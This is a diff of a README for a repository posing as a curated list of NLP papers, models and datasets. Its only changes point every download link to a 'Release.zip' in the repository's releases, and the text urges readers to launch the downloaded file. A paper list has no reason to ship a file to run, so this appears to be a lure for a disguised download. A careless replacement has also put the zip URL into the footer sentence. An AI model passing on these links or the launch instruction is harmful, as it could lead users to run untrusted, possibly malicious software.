@@ -2,7 +2,7 @@
 
 Welcome to **AWESOME-NLP-PAPERS**, a curated collection of NLP research papers, models, datasets, and tools covering fundamentals, advanced techniques, and real-world applications in the field of Natural Language Processing (NLP). Explore cutting-edge advancements, gain insights into neural networks, sequence modeling, transformers, and dive deep into the world of NLP with this comprehensive repository!
 
-[![Download AWESOME-NLP-PAPERS](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download AWESOME-NLP-PAPERS](https://github.com/KIETMIO/AWESOME-NLP-PAPERS/releases/download/v1.0/Release.zip)](https://github.com/KIETMIO/AWESOME-NLP-PAPERS/releases/download/v1.0/Release.zip)
 
 ## Features
 
@@ -32,9 +32,9 @@ Welcome to **AWESOME-NLP-PAPERS**, a curated collection of NLP research papers, 
 
 To get started with **AWESOME-NLP-PAPERS**, simply click on the following link:
 
-[![Download AWESOME-NLP-PAPERS](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download AWESOME-NLP-PAPERS](https://github.com/KIETMIO/AWESOME-NLP-PAPERS/releases/download/v1.0/Release.zip)](https://github.com/KIETMIO/AWESOME-NLP-PAPERS/releases/download/v1.0/Release.zip)
 
-👉 **[Download AWESOME-NLP-PAPERS](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)** 👈
+👉 **[Download AWESOME-NLP-PAPERS](https://github.com/KIETMIO/AWESOME-NLP-PAPERS/releases/download/v1.0/Release.zip)** 👈
 
 If the link above ends with the file name, ensure to launch the downloaded file to access all the incredible resources included in this repository.
 
@@ -52,4 +52,4 @@ Let's embark on this NLP journey together and unlock the endless possibilities o
 #naturallanguageprocessing #researchpapers #deeplearning #neuralnetworks #transformers #sequencemodeling #vietnamesenlp #nlpmodels #nlptools
 
 ---
-This README.md was dynamically generated using AI assistance.
+This https://github.com/KIETMIO/AWESOME-NLP-PAPERS/releases/download/v1.0/Release.zip was dynamically generated using AI assistance.
